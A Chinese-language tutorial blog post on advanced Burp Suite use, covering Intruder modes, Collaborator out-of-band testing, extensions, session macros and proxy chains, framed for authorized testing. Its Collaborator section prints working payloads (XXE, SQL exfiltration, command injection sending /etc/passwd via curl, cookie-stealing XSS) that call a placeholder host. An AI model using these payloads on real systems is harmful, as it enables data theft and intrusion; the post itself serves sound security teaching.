---
title: Burp Suite高级技巧与插件
date: 2026-01-15 08:00:00
tags:
  - 工具
  - 渗透测试
categories: 渗透测试
---

## 前言

Burp Suite 是渗透测试中最核心的中间人代理工具，但多数人只用到 Repeater 和基础 Intruder。本文整理实际项目中的高级技巧，覆盖 Intruder 攻击模式、Collaborator 带外检测、BApp 扩展生态、Macros 会话保持、上游代理链五个维度。

---

## 一、Intruder 攻击模式详解

Intruder 四种攻击模式直接影响测试效率。理解差异才能选对策略。

### 1.1 Sniper（狙击手）

单一 payload 逐位置轮询。

```
位置: username, password, token  |  Payload: <注入串>, <注入串>, <注入串>

Req 1: username=<注入串>&password=test&token=abc
Req 2: username=test&password=<注入串>&token=abc
Req 3: username=test&password=test&token=<注入串>
```

**适用**：SQL 注入点定位、XSS 反射点探测、逐参数 Fuzz。

### 1.2 Battering Ram（攻城锤）

同一 payload 同时填入所有位置。

```
Payload: 1, 2, 3
Req 1: user=1&pass=1&id=1
Req 2: user=2&pass=2&id=2
```

**适用**：多处需同步相同值的场景（CSRF Token + Cookie 同步遍历）。

### 1.3 Pitchfork（草叉）

多组 payload 一一对应并行遍历。

```
Set1: admin, user, guest    Set2: admin123, user123, guest123
→ Req 1: username=admin&password=admin123
→ Req 2: username=user&password=user123
```

**适用**：用户名-密码配对爆破、CSRF Token + 密码配对。字典行必须一一对应。

### 1.4 Cluster Bomb（集束炸弹）

所有 payload 集的笛卡尔积。请求总量 = |Set1| × |Set2| × ...。

```
Set1: admin, user    Set2: 123, abc, pass
→ 2 × 3 = 6 请求（交叉组合）
```

**适用**：用户名与密码交叉爆破。必须配合资源池限速，易触发账户锁定。

### 1.5 资源池与限速

```
Resource Pool → Max concurrent: 3~5
Request delay: 300-500ms（生产） / 50ms（靶场）
```

### 1.6 Grep 规则

`Options → Grep - Extract` 捕获关键字符串，表内直接显示命中，无需逐个翻看 Response：

- 登录失败："用户名或密码错误" "Invalid credentials"
- 登录成功："Welcome" "dashboard"
- 报错特征："SQL syntax" "Stack trace"
- 302 跳转 Location 值

### 1.7 Pitchfork + Recursive Grep：带 CSRF Token 爆破

1. Positions 标记 `username`、`password`、`csrf_token` 三个位置
2. Attack type: Pitchfork
3. Set1: 用户名，Set2: 密码，Set3: Recursive Grep 从响应中提取 token
4. 每次请求自动提取新 token 填入下一个请求

---

## 二、Burp Collaborator 带外检测

### 2.1 工作原理

Burp 内置 OOB 基础设施，将随机子域名 payload 注入目标，轮询确认 DNS/HTTP 回调。

```
Attacker → 注入 payload（含 {random}.oastify.com）→ Target Server
Target Server → DNS/HTTP 回调 → Burp Collaborator Server
Burp ← 轮询确认回调 ← Collaborator Server
```

`Project options → Misc → Collaborator Server` 检查连通性；自建用 `java -jar burp-collaborator.jar --server-domain=col.yourdomain.com`。

### 2.2 常见检测 Payload

**XXE 外带**：

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLAB-ID.oastify.com/xxe">]>
<data>&xxe;</data>
```

**Blind SSRF**：`http://COLLAB-ID.oastify.com/ssrf`

**SQL 外带（MySQL UNC）**：

```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.COLLAB-ID.oastify.com\\a'));
```

**命令注入 OOB**：

```bash
; nslookup $(whoami).COLLAB-ID.oastify.com
& curl http://COLLAB-ID.oastify.com/?d=$(cat /etc/passwd|base64)
```

**Blind XSS**：

```html
<script>new Image().src='http://COLLAB-ID.oastify.com/?c='+document.cookie</script>
```

Scanner 主动扫描时自动注入 Collaborator payload，对 XXE、SSRF、命令注入、模板注入等无回显漏洞尤其有效。

---

## 三、推荐 BApp 扩展

### 3.1 Turbo Intruder

HTTP 爆破引擎，Python 脚本控制，速度远超内置 Intruder。

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    for word in open('/path/to/wordlist.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if '200 OK' in req.response and 'Not Found' not in req.response:
        table.add(req)
```

参数建议：公网 5-10 并发，内网 10-50。用于竞态条件测试时，用 `engine.openGate('race')` 同时发出。

### 3.2 Logger++

增强版 HTTP History。核心功能：高级多条件过滤、实时 Grep 抓取密码 hash/token/API key、自定义颜色标记、CSV/SQLite 导出、请求 Diff 对比。

### 3.3 Autorize

自动化越权检测。高权限用户设为 Master Session，低权限用户设为 Alternative Session；正常浏览时插件自动用低权限身份重放每个请求，对比响应一致性。红色 = 高危越权，黄色 = 疑似 IDOR。

### 3.4 Auth Analyzer

处理 OAuth2.0/SAML/JWT/多因素认证的测试插件。录制多步认证流程、Token 自动提取、JWT alg:none 签名绕过测试、OAuth redirect_uri 篡改检测。

### 3.5 Hackvertor

在请求中嵌入标签，发送前动态解析：

```xml
Base64:  <@base64>admin:password<@/base64>
时间戳:  <@unix_timestamp>
URL编码: <@urlencode>../../etc/passwd<@/urlencode>
随机串:  <@random_uppercase(8)>
嵌套:    <@base64>user:<@random_lowercase(12)><@/base64>
```

支持自定义标签（Python/Java 脚本），适合 JWT 签名计算等复杂场景。

### 3.6 其他实用插件速览

| 插件 | 用途 |
|------|------|
| **ActiveScan++** | 增强被动/主动扫描规则 |
| **Backslash Powered Scanner** | 智能变异 payload，发现嵌套上下文注入 |
| **Param Miner** | 挖掘隐藏 GET/POST 参数和 Header |
| **JSON Web Tokens** | JWT 可视化解码/编辑/重签名 |
| **Retire.js** | JS 组件已知漏洞版本检测 |
| **J2EEScan** | Struts2/WebLogic/JBoss 漏洞扫描 |
| **Upload Scanner** | 文件上传后缀绕过、MIME 篡改测试 |
| **SAML Raider** | SAML 签名验证、XML 签名包装攻击 |

---

## 四、Session Handling 与 Macros 宏

目标会话超时后 Intruder/Scanner 后续请求全部失效。Macros 自动重新登录解决此问题。

### 4.1 创建宏

`Project options → Sessions → Macros → Add → Record Macro`

典型登录录制步骤：
1. GET /login → 获取 CSRF Token + Cookie
2. POST /login → 提交凭证
3. GET /dashboard → 确认登录成功

每步勾选 "Allow cookies to be set from response"，确保 Cookie Jar 被更新。

### 4.2 创建 Session Handling Rule

```
Session Handling Rules → Add → Scope: Intruder + Scanner
→ Rule Actions → Run a macro → 选择登录宏
→ 勾选 "Update only the following cookies"（指定登录 Cookie 名）
```

### 4.3 响应内容判断（防 Cookie 未过期但内容已失效）

```
Rule Actions → Check session is valid
→ 发出测试请求，正则检查响应是否含 "dashboard"
→ 若无效 → Run macro 重新登录
→ 重试上限 3 次，避免死循环
```

---

## 五、上游代理链与多级转发

### 5.1 配置上游代理

`User options → Connections → Upstream Proxy Servers → Add`

```
Destination host: *.target.com
Proxy: socks5://127.0.0.1:1080  （Chisel/SSH 动态转发到跳板机）
```

### 5.2 多级代理串联示例

```
Burp (127.0.0.1:8080)
  → 上游: 127.0.0.1:8888 (mitmproxy/自定义脚本)
    → 上游: corporate-proxy:3128 (公司网关)
      → 公网目标
```

### 5.3 按目标分流规则

| 目标 | 上游代理 |
|------|----------|
| `*.internal.target.com` | `socks5://127.0.0.1:1080` |
| `*.target.com` | `http://corp-proxy:8080` |
| `192.168.*` | `socks5://127.0.0.1:9050` |
| `*` | 直连 |

---

## 六、按场景插件组合推荐

**日常渗透**：Turbo Intruder + Logger++ + Hackvertor + Autorize + ActiveScan++

**API 测试**：Logger++ (Grep API Key) + Auth Analyzer (JWT/OAuth) + JSON Web Tokens + OpenAPI Parser

**重漏洞挖掘（SSRF/XXE/RCE）**：Collaborator + Turbo Intruder + Hackvertor + Backslash Powered Scanner

**Session/鉴权漏洞**：Autorize + Auth Analyzer + 自定义 Session Handling Macros

### 使用注意

- 按项目启用扩展，避免启动慢、内存高
- Turbo Intruder 高并发前 `ulimit -n 10240`
- Session Handling Rule 务必设置重试上限，防死循环
- Collaborator 自建需公网域名 + UDP 53；企业内网直接用官方默认服务器（走 443/80）

---

## 免责声明

本文所述工具与技术仅用于**合法授权的安全测试**，包括企业内部渗透测试、SRC 授权漏洞挖掘、CTF 竞赛与安全培训、自有系统安全评估。

未经授权对计算机系统进行扫描、测试或攻击的行为违反《中华人民共和国网络安全法》《刑法》等相关法律法规。使用者须自行承担法律责任。作者不对因滥用本文内容导致的任何后果负责。
